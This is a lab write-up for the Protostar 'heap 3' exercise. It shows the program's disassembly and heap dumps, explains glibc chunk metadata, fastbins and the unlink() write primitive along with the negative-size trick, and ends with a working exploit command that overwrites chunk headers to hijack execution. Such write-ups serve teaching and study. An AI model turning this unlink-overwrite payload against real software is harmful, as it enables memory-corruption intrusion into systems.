# Protostar heap 3

`link: (https://exploit.education/protostar/heap-three/)`

<hr>

## Disassembly of main: 

```asm
0x08048889 <+0>:     push   ebp
0x0804888a <+1>:     mov    ebp,esp
0x0804888c <+3>:     and    esp,0xfffffff0
0x0804888f <+6>:     sub    esp,0x20
0x08048892 <+9>:     mov    DWORD PTR [esp],0x20
0x08048899 <+16>:    call   0x8048ff2 <malloc>
0x0804889e <+21>:    mov    DWORD PTR [esp+0x14],eax
0x080488a2 <+25>:    mov    DWORD PTR [esp],0x20
0x080488a9 <+32>:    call   0x8048ff2 <malloc>
0x080488ae <+37>:    mov    DWORD PTR [esp+0x18],eax
0x080488b2 <+41>:    mov    DWORD PTR [esp],0x20
0x080488b9 <+48>:    call   0x8048ff2 <malloc>
0x080488be <+53>:    mov    DWORD PTR [esp+0x1c],eax
0x080488c2 <+57>:    mov    eax,DWORD PTR [ebp+0xc]
0x080488c5 <+60>:    add    eax,0x4
0x080488c8 <+63>:    mov    eax,DWORD PTR [eax]
0x080488ca <+65>:    mov    DWORD PTR [esp+0x4],eax
0x080488ce <+69>:    mov    eax,DWORD PTR [esp+0x14]
0x080488d2 <+73>:    mov    DWORD PTR [esp],eax
0x080488d5 <+76>:    call   0x8048750 <strcpy@plt>
0x080488da <+81>:    mov    eax,DWORD PTR [ebp+0xc]
0x080488dd <+84>:    add    eax,0x8
0x080488e0 <+87>:    mov    eax,DWORD PTR [eax]
0x080488e2 <+89>:    mov    DWORD PTR [esp+0x4],eax
0x080488e6 <+93>:    mov    eax,DWORD PTR [esp+0x18]
0x080488ea <+97>:    mov    DWORD PTR [esp],eax
0x080488ed <+100>:   call   0x8048750 <strcpy@plt>
0x080488f2 <+105>:   mov    eax,DWORD PTR [ebp+0xc]
0x080488f5 <+108>:   add    eax,0xc
0x080488f8 <+111>:   mov    eax,DWORD PTR [eax]
0x080488fa <+113>:   mov    DWORD PTR [esp+0x4],eax
0x080488fe <+117>:   mov    eax,DWORD PTR [esp+0x1c]
0x08048902 <+121>:   mov    DWORD PTR [esp],eax
0x08048905 <+124>:   call   0x8048750 <strcpy@plt>
0x0804890a <+129>:   mov    eax,DWORD PTR [esp+0x1c]
0x0804890e <+133>:   mov    DWORD PTR [esp],eax
0x08048911 <+136>:   call   0x8049824 <free>
0x08048916 <+141>:   mov    eax,DWORD PTR [esp+0x18]
0x0804891a <+145>:   mov    DWORD PTR [esp],eax
0x0804891d <+148>:   call   0x8049824 <free>
0x08048922 <+153>:   mov    eax,DWORD PTR [esp+0x14]
0x08048926 <+157>:   mov    DWORD PTR [esp],eax
0x08048929 <+160>:   call   0x8049824 <free>
0x0804892e <+165>:   mov    DWORD PTR [esp],0x804ac27
0x08048935 <+172>:   call   0x8048790 <puts@plt>
0x0804893a <+177>:   leave
0x0804893b <+178>:   ret
```

## heap before freeing

```
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
```

## heap after freeing 

```
0x804c000:      0x00000000      0x00000029      0x0804c028      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x0804c050      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000

```

```c
struct malloc_chunk {
    INTERNAL_SIZE_T prev_size; 0x4 bytes
    INTERNAL_SIZE_T size; 0x4 bytes
    struct malloc_chunk* fd; 0x4 bytes
    struct malloc_chunk* bk; 0x4 bytes
}
```

The malloc implementation uses these 3 bits as flag values. Quoting from the glibc Malloc Internals page, three flags are defined as follows:
> **A (0x04)**  
> Allocated Arena - the main arena uses the application's heap. Other arenas use mmap'd heaps.  
> To map a chunk to a heap, you need to know which case applies. If this bit is 0, the chunk comes from the main arena and the main heap. If this bit is 1, the chunk comes from mmap'd memory and the location of the heap can be computed from the chunk's address.  
>  
> **M (0x02)**  
> MMap'd chunk - this chunk was allocated with a single call to mmap and is not part of a heap at all.  
>  
> **P (0x01)**  
> Previous chunk is in use - if set, the previous chunk is still being used by the application, and thus the prev_size field is invalid. Note - some chunks, such as those in fastbins (see below) will have this bit set despite being freed by the application. This bit really means that the previous chunk should not be considered a candidate for coalescing - it's "in use" by either the application or some other optimization layered atop malloc's original code.


When a chunk is freed, it is added to the doubly linked list that is used to track which chunks are currently free. The fd and bk members are pointers to the next and the previous chunks and are only set when a chunk is freed.
The unlink() technique relies on a specific behaviour of the free() function which.
> [1] If the chunk located immediately before the chunk to be freed is unused, it is taken off its doubly-linked list via unlink() (if it is not the 'last_remainder') and consolidated with the chunk being freed.
> [2] If the chunk located immediately after the chunk to be freed is unused, it is taken off its doubly-linked list via unlink() (if it is not the 'last_remainder') and consolidated with the chunk being freed.


Whether or not a previous chunk is considered unused is determined by whether the prev_size member on the current chunk is set.

```c
#define unlink( P, BK, FD ) {
    BK = P->bk;
    FD = P->fd;
    FD->bk = BK;
    BK->fd = FD;
}
```

When calling free() on a chunk, unlink() performs two actions.
> 1. Writes the value of P->bk to (P->fd) + 12
> 2. Writes the value of P->fd to (P->bk) + 8


![before linking](https://i.imgur.com/FORracn.png)
![after linking](https://i.imgur.com/b3rmDRo.png)


In above code we can see that even after freeing the fd is set in the chunks, bk and prev_size are not. This is due to a feature called fastbins. Quoting from the glibc Malloc Internals page,

> Small chunks are stored in size-specific bins. Chunks added to a fast bin ("fastbin") are not combined with adjacent chunks - the logic is minimal to keep access fast (hence the name). Chunks in the fastbins may be moved to other bins as needed. Fastbin chunks are stored in a single linked list, since they're all the same size and chunks in the middle of the list need never be accessed.


During exploitation we need free() to treat our chunks as normal chunks rather than fastbins, so we'll have to increase the size of the chunks which we can control to more than 80 bytes.

> There is one final hurdle to exploitation that we need to overcome. Writing to the size and prev_size members require the use of NULL bytes. We are unable to do so because any NULL bytes that we pass to the program as an argument will be treated as a string terminator.
The Phrack paper [Once upon a free()](https://phrack.org/issues/57/9) describes a clever trick to avoid this issue. If we supply a value like 0xFFFFFFFC (-4 as a signed integer), the allocator will not place the chunk in the fastbin as 0xFFFFFFFC as an unsigned integer is a much larger value than 80. Due to an integer overflow during pointer arithmetic, the allocator thinks that the previous chunk actually starts at 4 bytes past the start of the current chunk.


![heap after using 0xfffffffc](https://i.imgur.com/ijrSqfw.png)


## exploit command
```bash
./heap3 $(python2 -c "print 'AAAA'*3+'\xB8\x64\x88\x04\x08\xFF\xD0'") $(python2 -c "print 'B'*36 + '\x65'") $(python2 -c "print '\xfc\xff\xff\xff'*2+'\x1c\xb1\x04\x08' + '\x14\xc0\x04\x08'")
```


![success](https://i.imgur.com/RTwDtTH.png)
